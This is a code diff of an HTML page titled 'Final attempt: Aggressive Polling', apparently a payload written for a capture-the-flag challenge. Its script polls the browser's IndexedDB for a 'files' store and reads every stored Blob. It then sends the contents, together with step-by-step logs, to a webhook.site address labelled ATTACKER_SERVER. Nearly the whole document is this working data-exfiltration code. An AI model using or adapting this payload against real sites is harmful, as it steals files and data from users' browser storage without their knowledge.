@@ -1,38 +1,80 @@
-<!-- extract.html -->
+<!-- last_attempt.html -->
 <!DOCTYPE html>
 <html>
 <body>
-  <h1>Extracting flag...</h1>
+  <h1>Final attempt: Aggressive Polling</h1>
   <script>
     const ATTACKER_SERVER = "https://webhook.site/dd1b22f1-4217-44e2-a142-ce1825ed0b23/";
-    // أعطه بعض الوقت للتأكد من أن كل شيء قد تم تحميله
-    setTimeout(() => { 
-      try {
+    
+    // تسجيل كل خطوة
+    const log = (msg) => fetch(`${ATTACKER_SERVER}?log=${encodeURIComponent(msg)}`);
+
+    const MAX_WAIT_TIME = 30000; // 30 ثانية
+    const POLLING_INTERVAL = 500; // نصف ثانية
+    let elapsedTime = 0;
+    
+    function extractFlag() {
+        log("DB is ready! Attempting to extract flag.");
+        // ... (نفس كود الاستخراج من المحاولات السابقة) ...
         const dbrequest = indexedDB.open("Files", 1);
         dbrequest.onsuccess = () => {
+          log("DB opened successfully for extraction.");
           const db = dbrequest.result;
-          if (!db.objectStoreNames.contains("files")) {
-            fetch(`${ATTACKER_SERVER}?error=store_still_not_found`);
-            return;
-          }
           const transaction = db.transaction("files", "readonly");
           const filesStore = transaction.objectStore("files");
           const getAllRequest = filesStore.getAll();
           getAllRequest.onsuccess = () => {
+            log(`Found ${getAllRequest.result.length} objects.`);
             getAllRequest.result.forEach(obj => {
               if (obj.file && obj.file instanceof Blob) {
                 obj.file.text().then(text => {
+                  log(`Found blob content: ${text.substring(0, 50)}`);
                   fetch(`${ATTACKER_SERVER}?flag=${encodeURIComponent(text)}`);
                 });
               }
             });
           };
         };
-        dbrequest.onerror = () => fetch(`${ATTACKER_SERVER}?error=db_open_error`);
-      } catch(e) {
-          fetch(`${ATTACKER_SERVER}?error=exploit_exception`);
+        dbrequest.onerror = () => log("DB open error during extraction!");
+    }
+
+    function pollForDB() {
+      if (elapsedTime > MAX_WAIT_TIME) {
+        log("Polling timed out.");
+        return;
       }
-    }, 2000); // 2 ثانية كافية
+      log(`Polling... elapsed: ${elapsedTime}ms`);
+      
+      try {
+          const dbrequest = indexedDB.open("Files", 1);
+          dbrequest.onsuccess = (event) => {
+            const db = event.target.result;
+            const stores = [...db.objectStoreNames];
+            log(`DB opened. Stores: [${stores.join(', ')}]`);
+            if (stores.includes("files")) {
+              db.close();
+              extractFlag(); // نجحنا
+            } else {
+              db.close();
+              elapsedTime += POLLING_INTERVAL;
+              setTimeout(pollForDB, POLLING_INTERVAL);
+            }
+          };
+          dbrequest.onerror = (event) => {
+            log(`DB open error while polling: ${event.target.error}`);
+            elapsedTime += POLLING_INTERVAL;
+            setTimeout(pollForDB, POLLING_INTERVAL);
+          }
+      } catch (e) {
+        log(`General error in poll loop: ${e.toString()}`);
+        elapsedTime += POLLING_INTERVAL;
+        setTimeout(pollForDB, POLLING_INTERVAL);
+      }
+    }
+    
+    log("Payload started.");
+    pollForDB();
+
   </script>
 </body>
 </html>
